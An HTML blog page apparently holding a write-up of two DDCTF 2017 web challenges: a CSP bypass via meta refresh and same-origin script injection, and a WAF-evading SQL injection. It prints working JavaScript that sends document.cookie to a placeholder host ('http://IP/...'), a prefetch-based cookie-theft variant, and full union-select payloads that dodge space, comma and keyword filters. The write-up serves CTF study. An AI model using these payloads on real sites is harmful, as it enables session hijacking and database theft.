@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>DDCTF 2017 两道 Web 题 Writeup</title>
+        <link rel="stylesheet" href="https://phuker.github.io/theme/css/main.css" />
+        <link href="https://phuker.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Phuker Atom Feed" />
+
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/jquery-3.2.0.min.js"></script>
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/cav.js"></script>
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/qqmain.js"></script>
+
+        <!--[if IE]>
+            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="https://phuker.github.io/#">Phuker  <strong>Phuker @ Blue-Whale Team</strong> </a></h1>
+                <nav><ul>
+                    <li><a href="/#">Home</a></li>
+                    <li><a href="https://phuker.github.io/category/about.html">About</a></li>
+                    <li><a href="https://phuker.github.io/category/misc.html">Misc</a></li>
+                    <li class="active"><a href="https://phuker.github.io/category/web.html">Web</a></li>
+                </ul>
+                </nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="https://phuker.github.io/ddctf2017-web.html" rel="bookmark"
+           title="Permalink to DDCTF 2017 两道 Web 题 Writeup">DDCTF 2017 两道 Web 题 Writeup</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <span>2017-06-11 周日</span>
+        	<span>| by <a class="url fn" href="https://phuker.github.io/author/admin.html">admin</a></span>
+<span>| tags: <a href="https://phuker.github.io/tag/ctf.html">CTF</a><a href="https://phuker.github.io/tag/web.html">web</a></span>
+</footer><!-- /.post-info -->      <p>上个月洒家参加了DDCTF玩了几把，其中有几道Web题还是很有意思的，在此做一下详细的记录。    </p>
+<h1>绕过 CSP 的 XSS</h1>
+<h2>分析</h2>
+<p>这题出得还是有点意思的。题目是一个Message Board，可以给admin发送message。发送完毕后提示<code>Success! wait for admin reading your message.</code>，并不知道发送到哪了。同时题目设置了CSP：</p>
+<div class="highlight"><pre><span></span>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;
+</pre></div>
+
+
+<p>显然无法加载其他域的资源。这里我简单测试了一下，发现这样的可以有反应：</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;0; url=&#39;http://IP/xxx.jpg?refresh&#39;&quot;</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>然后请求到自己的服务器，HTTP请求会带有一个Referer 头可以看到</p>
+<div class="highlight"><pre><span></span>http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=xxxhash....
+</pre></div>
+
+
+<p>这样的<strong>满足CSP的相同域</strong>的URL，访问发现就是用户的原始输入。  </p>
+<h2>思路</h2>
+<p>那么思路就很简单了，提交JavaScript代码，结合meta标签，就可以得到一个相同域的可控内容，可以作为 JavaScript 的 URL，然后用script标签引用就可以执行任意的JavaScript。  <br>
+这里有个小技巧，把meta标签加到注释里面，这样这个URL既是HTML又是合法JavaScript：admin直接访问这个message的时候是作为html解析，meta标签获得referer的URL。然后再弄到script标签src属性里面，就作为JavaScript解析，meta标签被注释掉就不会影响js。 </p>
+<h2>做题过程</h2>
+<p>提交这个来拿Cookie：</p>
+<div class="highlight"><pre><span></span><span class="c1">// &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&#39;http://IP/xxx.jpg?refresh&#39;&quot;&gt;</span>
+<span class="kd">var</span> <span class="nx">meta</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;meta&#39;</span><span class="p">);</span>
+<span class="nx">meta</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;http-equiv&#39;</span><span class="p">,</span><span class="s1">&#39;refresh&#39;</span><span class="p">);</span>
+<span class="nx">meta</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span><span class="s2">&quot;0; url=&#39;http://IP/xxx.jpg?cookie=&quot;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">meta</span><span class="p">);</span>
+</pre></div>
+
+
+<p>得到referer的URL：</p>
+<div class="highlight"><pre><span></span>http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=A
+</pre></div>
+
+
+<p>然后弄一个script标签：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;2; url=&#39;http://IP/xxx.jpg?test3&#39;&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=A&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>拿到Cookie：  </p>
+<div class="highlight"><pre><span></span>114.215.24.14 &quot;-&quot; &quot;-&quot; [20/May/2017:16:20:31 +0800] &quot;GET /xxx.jpg?cookie=hit%3Dc2V0Y29va2llKCJmbGFnIiwgImZsYWd7eHh4eHh4eHh4eHh4eHh4eH0iLCB0aW1lKCkrMzYwMDAwMDAsICIvdDIvZjFhZ18xc19oM3IzIik7 HTTP/1.1&quot; 200 15075 &quot;http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=B&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;
+setcookie(&quot;flag&quot;, &quot;flag{xxxxxxxxxxxxxxxx}&quot;, time()+36000000, &quot;/t2/f1ag_1s_h3r3&quot;);
+</pre></div>
+
+
+<p>显然flag在path为/t2/f1ag_1s_h3r3的Cookie里面。那么用一个iframe就可以了。重复刚才的步骤，搞JavaScript代码：  </p>
+<div class="highlight"><pre><span></span><span class="c1">// &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&#39;http://IP/xxx.jpg?test4&#39;&quot;&gt;</span>
+<span class="kd">var</span> <span class="nx">iframe</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
+<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">var</span> <span class="nx">meta</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;meta&#39;</span><span class="p">);</span>
+    <span class="nx">meta</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;http-equiv&#39;</span><span class="p">,</span><span class="s1">&#39;refresh&#39;</span><span class="p">);</span>
+    <span class="nx">meta</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span><span class="s2">&quot;0; url=&#39;http://IP/xxx.jpg?flag=&quot;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">iframe</span><span class="p">.</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">+</span><span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="nx">meta</span><span class="p">);</span>
+<span class="p">},</span><span class="mi">1000</span><span class="p">);</span>
+</pre></div>
+
+
+<p>搞script标签：  </p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;2; url=&#39;http://IP/xxx.jpg?test5&#39;&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/t2/f1ag_1s_h3r3/&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;iframe&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=C&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>拿到flag：  </p>
+<div class="highlight"><pre><span></span>114.215.24.14 &quot;-&quot; &quot;-&quot; [20/May/2017:16:40:58 +0800] &quot;GET /xxx.jpg?flag=flag%3Dflag%257BDDCTF-82b6ac5623b04c8f823d29fa73875c9c%2540didichuxing.com%257D%3B%20hit%3Dc2V0Y29va2llKCJmbGFnIiwgImZsYWd7eHh4eHh4eHh4eHh4eHh4eH0iLCB0aW1lKCkrMzYwMDAwMDAsICIvdDIvZjFhZ18xc19oM3IzIik7 HTTP/1.1&quot; 200 15075 &quot;http://114.215.24.14/t2/adm1n_r3ad_m3ssag3.php?hash=D&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;
+&quot;flag{DDCTF-82b6ac5623b04c8f823d29fa73875c9c@didichuxing.com}&quot;
+</pre></div>
+
+
+<h2>附：其他类似的利用方法：</h2>
+<p>搜到一篇文章 <a href="http://paper.seebug.org/91/">http://paper.seebug.org/91/</a>，学到了prefetch bypass CSP 的姿势。发送一个<code>&lt;link rel="prefetch" href="http://IP/"&gt;</code>就可以加载其他域的资源。那么payload就可以用：</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;http://IP/?cookie=&#39;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;link&quot;</span><span class="p">);</span>  
+<span class="nx">n</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;rel&quot;</span><span class="p">,</span> <span class="s2">&quot;prefetch&quot;</span><span class="p">);</span>  
+<span class="nx">n</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;href&quot;</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>  
+<span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">n</span><span class="p">);</span>
+</pre></div>
+
+
+<p>让输入既是HTML又是合法JavaScript，可以用上文的注释，也可以搞一个无关变量。</p>
+<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="s1">&#39;&lt;link rel=&quot;prefetch&quot; href=&quot;http://VPS的IP/&quot;&gt;&#39;</span><span class="p">;</span>
+</pre></div>
+
+
+<h2>吐槽：Proof of Work 根本 proof 不了什么 work</h2>
+<p>发送的时候要求输入</p>
+<div class="highlight"><pre><span></span>verification code (substr(md5($_POST[&#39;code&#39;]),6,6)===&#39;cbc72f&#39;) :
+</pre></div>
+
+
+<p>这样的验证码。然而现在有<a href="https://github.com/kmyk/libproofofwork">现成的库 libproofofwork</a>可以飞速生成验证码，也可以自己手动生成字典来解决这个问题，对于老司机而言效果还不如传统图片验证码。<br>
+有了这种解决方法，为了节约时间同时让注意力集中在题目本身，可以写脚本辅助发送payload。  </p>
+<h1>各种防护的SQL注入</h1>
+<p><a href="http://118.190.134.8/t1/news.php?id=1">http://118.190.134.8/t1/news.php?id=1</a>这是一个简单的新闻网站，</p>
+<h2>初步探测</h2>
+<p>有三种返回状态：</p>
+<ul>
+<li>error  MySQL出错</li>
+<li>R U a script little boy??? 被WAF过滤</li>
+<li>正常返回，一篇文章有标题和内容</li>
+</ul>
+<p>根据 <a href="http://118.190.134.8/t1/news.php?id=1a">http://118.190.134.8/t1/news.php?id=1a</a> 报错，可以猜测SQL语句类似</p>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">news</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="err">用户输入</span>
+</pre></div>
+
+
+<p>其中用户输入并没有引号包裹。（这个经验可以通过手动执行 1 1a '1' '1a' 4种SQL来得到）<br>
+在这个网站上证明这一点：  </p>
+<ul>
+<li><a href="http://118.190.134.8/t1/news.php?id=0||1=2">http://118.190.134.8/t1/news.php?id=0||1=2</a> 无文章</li>
+<li><a href="http://118.190.134.8/t1/news.php?id=0||1=1">http://118.190.134.8/t1/news.php?id=0||1=1</a> 正常显示文章</li>
+</ul>
+<h2>WAF 过滤</h2>
+<p>手工简单测试可以发现，过滤了：</p>
+<div class="highlight"><pre><span></span>&#39;
+空格
+,
+&quot;
+/
+\
+sleep
+
+后来又发现过滤了 secret
+</pre></div>
+
+
+<p>允许的：</p>
+<div class="highlight"><pre><span></span>select
+union
+(
+)
+%09
+*
+from
+</pre></div>
+
+
+<h2>绕过 WAF 的 trick</h2>
+<p>这道题主要就是绕过WAF，先来写一下绕过WAF用到的trick。以下假设数据库的表有3列。<br>
+<strong>过滤了空格</strong><br>
+可以用%09 %0a 这种绕过。    </p>
+<p><strong>过滤了逗号</strong><br>
+是个关键点。可以用<code>join</code>绕过:  </p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span><span class="p">)</span>
+</pre></div>
+
+
+<p>相当于</p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">a</span><span class="p">,</span>  <span class="mi">2</span> <span class="k">as</span> <span class="n">b</span><span class="p">,</span> <span class="mi">3</span> <span class="k">as</span> <span class="k">c</span>
+</pre></div>
+
+
+<p><strong>过滤了字段名 secret</strong><br>
+使用别名替换原始字段名的trick绕过：</p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">f1</span><span class="p">,</span> <span class="n">f2</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">f1</span><span class="p">,</span> <span class="mi">2</span> <span class="k">as</span> <span class="n">f2</span><span class="p">,</span> <span class="mi">3</span> <span class="k">as</span> <span class="n">f3</span> <span class="k">from</span> <span class="n">news</span> <span class="k">where</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span><span class="p">)</span> <span class="k">as</span> <span class="n">sb</span>
+</pre></div>
+
+
+<p>就相当于从 news 表中查询前两列。  </p>
+<p><strong>如果连表名都被干掉了？</strong><br>
+TCTF 2017 决赛 web LuckyGame 就遇到了这种情况。在那道题的特殊情况下，可以用 <code>select ... into ...</code> 利用已有的SQL注入点把要的信息先搞到一个用户变量里面，然后再在别的地方查询这个变量就可以了。详情略。</p>
+<h2>做题过程</h2>
+<p>有了上面的绕过WAF方法，具体的过程如下（空格仍然保留，使用时自行替换成%09）：确定标题是第二列，内容是第三列：</p>
+<div class="highlight"><pre><span></span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">d</span><span class="p">)</span>
+</pre></div>
+
+
+<p>查询 user() 和 version()：</p>
+<div class="highlight"><pre><span></span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">b</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="k">version</span><span class="p">())</span><span class="k">c</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">d</span><span class="p">)</span>
+</pre></div>
+
+
+<p>猜测表名 news，字段 id title content：</p>
+<div class="highlight"><pre><span></span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="n">title</span> <span class="k">from</span> <span class="n">news</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="n">b</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">d</span><span class="p">)</span>
+</pre></div>
+
+
+<p>显然一共有4个字段，还剩一个字段。手动猜了一下，flag这种都不正确，于是读取<code>INFORMATION_SCHEMA.COLUMNS</code>表：  </p>
+<div class="highlight"><pre><span></span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="k">WHERE</span> <span class="k">TABLE_NAME</span><span class="o">=</span><span class="mi">0</span><span class="n">x6e657773</span> <span class="k">and</span> <span class="n">ORDINAL_POSITION</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span><span class="n">b</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">d</span><span class="p">)</span>
+</pre></div>
+
+
+<p>显示另一个字段是 <code>secret</code> （WTF?? 要知道就使劲猜了）。这时候想着直接用上文方法查询<code>secret</code>字段即可出flag，但是试了一下直接被WAF过滤<code>secret</code>这个词，这里是第二个关键点。  <br>
+用别名的方法绕过：  </p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="n">field_1</span><span class="p">,</span><span class="n">field_2</span><span class="p">,</span><span class="n">field_3</span><span class="p">,</span><span class="n">field_4</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">field_1</span><span class="p">,</span> <span class="mi">2</span> <span class="k">as</span> <span class="n">field_2</span><span class="p">,</span> <span class="mi">3</span> <span class="k">as</span> <span class="n">field_3</span><span class="p">,</span> <span class="mi">4</span> <span class="k">as</span> <span class="n">f4</span> <span class="k">from</span> <span class="n">news</span> <span class="k">where</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span><span class="p">)</span> <span class="k">as</span> <span class="n">sb</span>
+</pre></div>
+
+
+<p>用 field_1 这样字段的别名代替原来的字段名。<br>
+由于逗号同时被过滤了，那么就需要再用上文的 trick，变为：  </p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">f4</span> <span class="k">from</span> <span class="p">(</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">f1</span><span class="p">)</span><span class="n">t1</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span> <span class="k">as</span> <span class="n">f2</span><span class="p">)</span><span class="n">t2</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span> <span class="k">as</span> <span class="n">f3</span><span class="p">)</span><span class="n">t3</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span> <span class="k">as</span> <span class="n">f4</span><span class="p">)</span><span class="n">t4</span>  <span class="p">)</span> <span class="k">where</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="k">as</span> <span class="n">sb</span>
+</pre></div>
+
+
+<p>最终的Payload：  </p>
+<div class="highlight"><pre><span></span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="n">f4</span> <span class="k">from</span> <span class="p">(</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">f1</span><span class="p">)</span><span class="n">t1</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span> <span class="k">as</span> <span class="n">f2</span><span class="p">)</span><span class="n">t2</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span> <span class="k">as</span> <span class="n">f3</span><span class="p">)</span><span class="n">t3</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span> <span class="k">as</span> <span class="n">f4</span><span class="p">)</span><span class="n">t4</span>  <span class="p">)</span> <span class="k">where</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="k">as</span> <span class="n">sb</span><span class="p">)</span><span class="n">b</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span> <span class="k">JOIN</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">d</span><span class="p">)</span>
+</pre></div>
+
+
+<p>URL：</p>
+<div class="highlight"><pre><span></span>http://118.190.134.8/t1/news.php?id=0%09union%09select%09*%09from%09((select%091)a%09JOIN%09(select%09f4%09from%09(%09select%09*%09from%09((select%091%09as%09f1)t1%09join%09(select%092%09as%09f2)t2%09join%09(select%093%09as%09f3)t3%09join%09(select%094%09as%09f4)t4%09%09)%09where%091=2%09union%09select%09*%09from%09news%09where%09id=4)%09as%09sb)b%09JOIN%09(select%093)c%09JOIN%09(select%094)d)
+</pre></div>
+    </div><!-- /.entry-content -->
+    <p></p>
+    <br />
+    <br />
+    <hr style="border: 1px solid #EEEEEE;" />
+    <p>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）<p>
+    <br />
+    <div class="comments">
+      <h2>Comments</h2>
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = "https://phuker.github.io/ddctf2017-web.html";
+          this.page.identifier = "ddctf2017-web.html"; 
+        };
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://phuker.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+      </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+
+  </article>
+</section>
+        <section id="extras" class="body">
+                <div class="blogroll">
+                        <h2>blogroll</h2>
+                        <ul>
+                            <li><a href="http://blue-whale.me" target="_blank">Blue-Whale Team</a></li>
+                        </ul>
+                </div><!-- /.blogroll -->
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="https://phuker.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+                            <li><a href="https://github.com/phuker" target="_blank">GitHub</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+        <footer id="contentinfo" class="body">
+                <p>Powered by <a href="http://getpelican.com/" target="_blank">Pelican</a>. Theme <a href="https://github.com/blueicefield/pelican-blueidea/" target="_blank">blueidea</a>, inspired by the default theme. Modified by Blue-Whale Team.</p>
+        </footer><!-- /#contentinfo -->
+
+<script id="dsq-count-scr" src="//phuker.disqus.com/count.js" async></script>
+</body>
+</html>
